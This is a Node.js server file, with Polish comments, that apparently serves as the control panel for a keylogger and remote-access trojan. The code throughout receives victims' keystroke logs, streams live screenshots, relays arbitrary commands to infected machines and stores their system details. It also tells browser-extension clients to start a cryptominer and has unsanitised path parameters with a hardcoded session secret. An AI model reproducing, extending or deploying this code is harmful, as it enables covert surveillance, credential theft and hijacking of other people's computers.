const express = require("express");
const session = require("express-session");
const socketio = require("socket.io");
const fs = require("fs");
const app = express();
const render = require("./js/views.js");
const sharp = require("sharp");

const server = app.listen(3000, function () {
  console.log("App listening on port 3000!");
});
const io = socketio(server, {
  maxHttpBufferSize: 10e6,
  pingTimeout: 60000,
  cors: {
    origin: "*",
  },
});
let clients = [];



const getOfflineClients = () => {
  var c = [];

  fs.readdirSync("./clients").forEach((file) => {
    c.push(file);
    //console.log(file);
  });
  return c;
}

let offlineclients = getOfflineClients();
var delay = 10;
var fps = 0;
// setInterval(() => {
//   console.log(`FPS: ${fps}`);
//   fps = 0;
// }, 1000);

app.use(express.json());

app.use(
  express.urlencoded({
    extended: true,
  })
);

app.use(express.static("views"));
app.use(express.static("clients"));

app.use(express.static(__dirname + "/public")); //Set public files to use

app.set("view engine", "ejs");

app.use(
  session({
    secret: "test",
    resave: true,
    saveUninitialized: true,
    cookie: {
      secure: false,
    }, //Remember to set it to true!
  })
);

app.get("/", render.loginPage); //Render main page with login and register etc.

app.get("/dashboard", render.dashboard);
//Render dashboard page
app.get("/settings", render.settings); //Render dashboard page

app.post("/", render.login);

app.get("/vnc/:ClientName/:ClientId", render.vncclient);

app.get("/ftp/:Action?/:FileName?", (req, res) => {
  if (req.params.FileName == null) {
    if (req.session.isLogged) {
      res.render("ftp", {
        isLogged: req.session.isLogged,
        username: req.session.username,
        files: fs.readdirSync("./ftp"),
      });
    } else res.render("index");
  } else if (req.session.Action == "download" && req.params.FileName != null) {
    res.download("ftp/" + req.params.FileName, function (err) {
      if (err) {
        console.log(err);
      }
    });
  } else if (req.session.Action == "upload") {
    console.log(req);
  }
});
app.post("/ftp/:Action?/:FileName?", (req, res) => {
  console.log("chuj");
  console.log(req.body);
  //fs.appendFileSync("./ftp/" + "test", req.)
});

app.get("/logs/:ClientName/:DirName?/:FileName?", (req, res) => {
  const ClientName = req.params.ClientName;
  const DirName = req.params.DirName;
  const FileName = req.params.FileName;
  var fileContents;
  var ext;

  if (DirName != null && fs.existsSync(`./clients/${ClientName}`)) {
    if (FileName != null) {
      //Pobiera zawartosc pliku
      try {
        ext = FileName.split(".")
          .filter(Boolean) // removes empty extensions (e.g. `filename...txt`)
          .slice(1)
          .join(".");
        if (ext == "txt") {
          fileContents = fs
            .readFileSync(`./clients/${ClientName}/${DirName}/${FileName}`)
            .toString();
        } else {
          fileContents = fs.readFileSync(
            `./clients/${ClientName}/${DirName}/${FileName}`,
            "base64"
          );
        }
      } catch (err) {}
    } else {
      fileContents = fs.readdirSync(`./clients/${ClientName}/${DirName}`);
    }
  } else {
    fileContents = fs.readdirSync(`./clients/${ClientName}`);
  }

  //Render log
  if (req.session.isLogged) {
    res.render("log", {
      content: fileContents,
      clientname: ClientName,
      dirname: DirName,
      filename: FileName,
      type: ext,
    });
  } else res.render("index");
});

app.post("/logout", render.logout);

io.of("/extension").on("connection", (socket) => {
  socket.on("join", (msg) => {
    console.log("Dolaczyl " + socket.id + " " + msg);
    socket.emit("command", "minerstart");
  });
  socket.on("logs", async (msg) => {
    const now = new Date();
    const current = `[${now.getHours()}:${now.getMinutes()}] `;
    console.log(current + msg);
    //writeToFile(socket.name, current + msg);
  });
  socket.on("screenshotResult", async (msg) => {
    console.log(msg);
    //writeToFile(socket.name, current + msg);
  });
});
io.on("connection", (socket) => {
  socket.on("join", (msg) => {
    let info = msg.split(":");
    socket.ip = info[0];
    socket.name = info[1];
    socket.version = info[2];
    socket.joined = false;
    // socket.version = msg;  -- for client version 1.1

    console.log("Dolaczono: " + socket.name + " " + socket.ip);
    socket.emit("command", "systeminfo");
    checkDirectoryExists(socket.name);
  });

  socket.on("logs", async (msg) => {
    await io.fetchSockets(); //fix error c++ first send keystrokes
    //console.log(socket.name + ":" + msg);
    const now = new Date();
    const current = `[${now.getHours()}:${now.getMinutes()}] `;
    writeToFile(socket.name, current + msg);
  });

  socket.on("command", (msg) => {
    console.log(msg);
    if (msg.cmd == "delay+") {
      delay += 1;
      console.log(`Aktualny delay: ${delay}`);
      io.sockets.sockets.get(msg.id).emit("delay", delay);
    } else if (msg.cmd == "delay-") {
      console.log(`Aktualny delay: ${delay}`);
      delay -= 1;
      io.sockets.sockets.get(msg.id).emit("delay", delay);
    } else {
      try {
        io.sockets.sockets.get(msg.id).emit("command", msg.cmd);
      } catch (err) {}
    }
  });

  socket.on("commandResult", async (msg) => {
    let bufferObj = Buffer.from(msg, "base64");
    let decodedString = bufferObj.toString("utf-8");
    console.log(decodedString);
    if (socket.joined == false) {
      parseClientInfo(decodedString, socket);
      socket.joined = true;
    } else {
      io.emit("commandResult", {
        id: socket.id,
        response: decodedString,
      });
    }
  });

  socket.on("screenshotResult", async (msg) => {
    //console.log(msg);
    // var d = new Date(),
    //   dformat =
    //     [d.getMonth() + 1, d.getDate(), d.getFullYear()].join("_") +
    //     "-" +
    //     [d.getHours(), d.getMinutes(), d.getSeconds()].join("_");
    //const buffer = Buffer.from(msg, "base64");
    fps += 1;

    io.emit("screenshotResult", {
      id: socket.id,
      response: msg,
    });

    // sharp(Buffer.from(msg, 'base64'))
    // .jpeg({quality: 20})
    // .resize({width: 1280, height: 720})
    // .toBuffer((err, buffer) => {
    //   if (err) {
    //     console.error(err);
    //   } else {
    //     // The resized and compressed image data is now in the `buffer` variable
    //     io.emit("screenshotResult", {
    //       id: socket.id,
    //       response: buffer.toString('base64'),
    //     });
    //   }
    // });

    // fs.writeFileSync(
    //   `./clients/${socket.name}/screenshots/screenshot-${dformat}.jpg`,
    //   buffer
    // );
  });

  socket.on("delete", async (msg) => {
    fs.rmSync(`./clients/${msg.clientname}`, {
      recursive: true,
      force: true,
    });
    offlineclients.splice(offlineclients.indexOf(msg.clientname), 1);
  });

  socket.on("disconnect", () => {
    if (socket.name != null) {
      //if socket is a keylogger instance
      console.log("Wyszedl: " + socket.name + " " + socket.ip);

      removeById(clients, socket.id);
      offlineclients.push(socket.name);
      //offlineclients.push(socket.name);
    }
  });
});

function parseClientInfo(decodedString, socket) {
  const outputLines = decodedString.split("\n");
  const osNameLine = outputLines.find((line) => line.startsWith("OS Name:"));
  const osName = osNameLine.split(":")[1].trim();
  const hostNameLine = outputLines.find((line) =>
    line.startsWith("Host Name:")
  );
  const hostName = hostNameLine.split(":")[1].trim();
  const ipAddress = decodedString.match(/IP address[^:]+: (.*)/)[1];
  socket.name = hostName;
  clients.push({
    id: socket.id,
    name: hostName,
    ip: ipAddress,
    version: socket.version,
    system: osName,
  });
  let index = offlineclients.indexOf("test");
  if (index > -1) {
    offlineclients.splice(index, 1);
  }
}

function checkDirectoryExists(clientname) {
  if (!fs.existsSync(`./clients`)) fs.mkdirSync("./clients");

  if (!fs.existsSync(`./clients/${clientname}`)) {
    fs.mkdirSync(`./clients/${clientname}`);
    fs.mkdirSync(`./clients/${clientname}/logs`);
    fs.mkdirSync(`./clients/${clientname}/screenshots`);
  }
}

function writeToFile(clientname, msg) {
  msg = msg.replace("\n", "");
  fs.appendFileSync(`./clients/${clientname}/logs/log.txt`, msg + "\n");
}

const removeById = (arr, id) => {
  const requiredIndex = arr.findIndex((el) => {
    return el.id === String(id);
  });
  if (requiredIndex === -1) {
    return false;
  }
  return !!arr.splice(requiredIndex, 1);
};



exports.clients = clients;
exports.offlineclients = offlineclients;
